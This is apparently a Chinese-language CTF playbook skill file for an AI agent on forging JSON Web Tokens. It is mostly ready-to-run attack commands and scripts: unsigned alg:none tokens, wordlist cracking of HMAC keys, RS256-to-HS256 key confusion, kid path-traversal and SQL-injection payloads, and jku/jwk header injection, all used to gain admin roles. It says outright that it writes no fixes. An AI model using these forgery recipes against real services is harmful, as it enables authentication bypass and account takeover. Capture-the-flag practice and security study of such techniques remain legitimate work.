---
name: ctf-web-jwt
description: CTF JWT 伪造 攻击 playbook。识别/触发：JWT/JSON Web Token/eyJ/eyJhbGci/alg:none/none算法/none algorithm/弱密钥/弱口令/kid注入/JWK注入/JWS/JWE/Cookie头/Authorization Bearer/HS256 RS256 混淆/公钥当HMAC密钥/jku x5u 参数注入/无签名伪造/密钥爆破。碰到这些指纹时由二级 ctf-web 路由表调用本 leaf，专项解决"这个考点怎么打"。
---

# CTF JWT 伪造 解题 playbook

> **定位**：CTF skill 树三级 leaf（知识锚点）。由二级 `ctf-web` 路由表按识别特征调用；本文件只讲"这个考点怎么打"，不重复工作流。
> **CTF 原则**：拿 flag 即止、不写修复、不臆想、区分确认与推测。靶机常不出网 → 优先本地回显路径（伪造 token 换身份后直接读 flag）。

## 识别特征（什么时候调我）
- HTTP 头/cookie 里出现 `eyJ...eyJ...` 三段点分（base64url）：`Authorization: Bearer eyJhbGciOi...`、`Set-Cookie: token=eyJ...`
- 改 token 里 role/userid/admin/isadmin 字段后响应或页面变化（401→200、用户名切换、管理员页面出现）
- 登录后下发 JWT，前端/后端校验依赖它判断权限
- 源码/JS 里出现 `jsonwebtoken`/`jwt.decode`/`jwt.verify`/`jwt.encode`、Python `pyjwt`/`jwt`、Go `jwt-go`、Java `jjwt`
- 报错回显算法/kid/header 字段：`alg`、`kid`、`jku`、`x5u`、`jwk` 出现在请求或错误信息里

## 核心攻击手法

### 0. 先解码看结构
```bash
# 拆三段，base64url 解 header + payload
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.x" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null
# 或用 jwt_tool 一把梭
python3 jwt_tool.py <TOKEN>     # 自动解码 + 列举可尝试的攻击面
```

### 1. alg:none 无签名伪造
适用：服务端 `verify` 未校验 alg（很多老库/手写实现）。把 `alg` 改成 `none`，删签名段，留尾部点。
```bash
# jwt_tool 自动生成 none token（T=空，干净）
python3 jwt_tool.py <TOKEN> -T -I -pc role -pv admin          # 改 payload
python3 jwt_tool.py <TOKEN> X                                 # alg:none 全套变体
# 手搓：header {"alg":"none","typ":"JWT"} -> base64url，payload base64url，最后留一个空段
python3 -c '
import base64,json
h=base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode()
p=base64.urlsafe_b64encode(json.dumps({"user":"admin","role":"admin"}).encode()).rstrip(b"=").decode()
print(f"{h}.{p}.")'
```

### 2. 弱密钥爆破（HS256/HS384）
适用：HMAC 对称密钥，字典/弱口令。
```bash
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt     # 16500 = JWT (HS256)
# 或 jwt_tool / jwt-cracker
python3 jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/rockyou.txt
# 简单爆破：对短密钥
python3 -c '
import hmac,hashlib,base64,json,sys
t=sys.argv[1]; sig=t.split(".")[2]
hdr,pay=t.split(".")[:2]
msg=(hdr+"."+pay).encode()
for w in open("/usr/share/wordlists/rockyou.txt",errors="ignore"):
    w=w.strip()
    s=base64.urlsafe_b64encode(hmac.new(w.encode(),msg,hashlib.sha256).digest()).rstrip(b"=").decode()
    if s==sig: print("KEY:",w); break' "$TOKEN"
# 拿到密钥后重签
python3 jwt_tool.py <TOKEN> -S hs256 -p "<KEY>" -I -pc role -pv admin
```

### 3. RS256 → HS256 算法混淆（公钥当 HMAC 密钥）
适用：服务端把 `alg` 当真相信，公钥可拿到（`/jwks.json`、`/.well-known/jwks.json`、源码、TLS 证书）。
```bash
# 1) 找公钥
curl -s https://target/.well-known/jwks.json
# 2) 用公钥做 HMAC 密钥重签（注意 PEM 格式 vs raw 字节，CTF 多见 PEM 整段做 key）
python3 jwt_tool.py <TOKEN> -S hs256 -k pubkey.pem -I -pc role -pv admin
# PyJWT 示例
python3 -c '
import jwt
pub=open("pubkey.pem").read()
print(jwt.encode({"user":"admin","role":"admin"},pub,algorithm="HS256"))'
```

### 4. kid 注入（路径穿越 / SQLi / 命令注入）
`kid`（key id）常被拼进文件路径或 SQL，可穿越读已知文件、或注入。
```bash
# 穿越到一个内容已知的文件当密钥（如 /dev/null 空、/proc/sys/...），再 HMAC 签名
python3 jwt_tool.py <TOKEN> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
python3 jwt_tool.py <TOKEN> -I -hc kid -hv "../../../../proc/sys/kernel/hostname" -S hs256 -p "$(hostname)"
# kid SQLi：把密钥查出来后再签
python3 jwt_tool.py <TOKEN> -I -hc kid -hv "key' UNION SELECT 'knownkey'-- " -S hs256 -p "knownkey"
```

### 5. jku / x5u / jwk 注入（指向攻击者密钥）
适用：服务端会拉取 `jku`/`x5u` 指向的 JWKS 来验签。**CTF 靶机常不出网**，优先看是否能指到靶机自身可访问路径或本地文件；出网可用下面 webhook。
```bash
# jwt_tool 内置：生成自签名密钥 + 注入 jwk header + 重签
python3 jwt_tool.py <TOKEN> -X i                          # jwk 注入（embedded）
python3 jwt_tool.py <TOKEN> -X s <URI>                    # jku 指向 <URI> 的 JWKS
# 自己起一个返回 JWKS 的 endpoint（出网才行，CTF 常不行）
# 生成密钥对
openssl genrsa -out jwtRS256.key 2048
openssl rsa -in jwtRS256.key -pubout -out jwtRS256.key.pub
# 用 jwt_tool 把公钥包成 JWKS，挂到 python http.server，jku 指向它
```

### 6. JWE（加密的 JWT，五段 `eyJ...eyJ...xxx..xxx..xxx`）
```bash
# 优先看 alg 是 dir/RSA/HMAC；弱密钥同理。常见考点：alg=A128KW 弱 key、压缩(Critical) attack
# 用 jose / jwt_tool
python3 jwt_tool.py <JWE_TOKEN> --decrypt
```

## CTF 实战结晶
（待积累，下次遇到本题型回填此处：题名 + 确切 trick + payload + 链路）

## 工具命令
```bash
# jwt_tool（首选，一站式 decode/exploit）
pip3 install pyjwt cryptography
git clone https://github.com/ticarpi/jwt_tool && cd jwt_tool && python3 jwt_tool.py -h
# 爆破
hashcat -m 16500 jwt.txt rockyou.txt
# 本地起 JWKS endpoint（仅出网场景）
python3 -m http.server 8000
# 快速验签/重签
python3 -c 'import jwt; print(jwt.encode({"user":"admin"},"secret",algorithm="HS256"))'
```

## 深度参考（穷尽技巧时加载）
- hack-skills-main/skills/jwt-oauth-token-attacks/SKILL.md

## 关联 leaf
- `ctf-web-sqli`：kid 字段常被拼进 SQL，二者串成 kid-SQLi 链
- `ctf-web-deser`：JWT payload 解出后可能是反序列化对象（Java jjwt + Jackson）
- `ctf-web-ssrf`：jku/x5u 指向内网 JWKS endpoint，SSRF 读密钥（典型链：JWT → SSRF → 拿 RS256 公钥 → 算法混淆）
